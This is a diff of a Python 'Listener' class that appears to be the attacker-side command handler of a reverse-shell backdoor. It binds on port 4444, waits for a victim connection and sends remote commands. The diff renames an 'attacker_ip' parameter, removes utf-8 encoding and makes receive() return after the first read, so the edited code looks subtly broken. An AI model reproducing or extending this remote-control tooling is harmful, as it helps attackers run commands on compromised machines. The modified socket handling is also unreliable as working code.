@@ -3,10 +3,10 @@ import socket
 from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
 class Listener:
-    def __init__(self, attacker_ip, port=4444):
+    def __init__(self, ip, port=4444): # controlled
         listener = socket.socket(AF_INET, SOCK_STREAM)
         listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-        listener.bind((attacker_ip, port))
+        listener.bind((ip, port))
         listener.listen(0)
         print('[+] Waiting for incoming connections ...')
 
@@ -15,19 +15,17 @@ class Listener:
 
     def send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(bytes(json_data, 'utf-8'))
+        self.connection.send(json_data)
 
     def receive(self):
         json_data = ''
         while True:
             try:
-                received_data = self.connection.recv(1024).decode('utf-8')
-                if not received_data:
-                    break
-                json_data += received_data
+                json_data += self.connection.recv(1024)
+                return json_data
             except ValueError:
                 continue 
-        return json_data
+        
 
     def execute_remote_command(self, command):
         self.send(command)
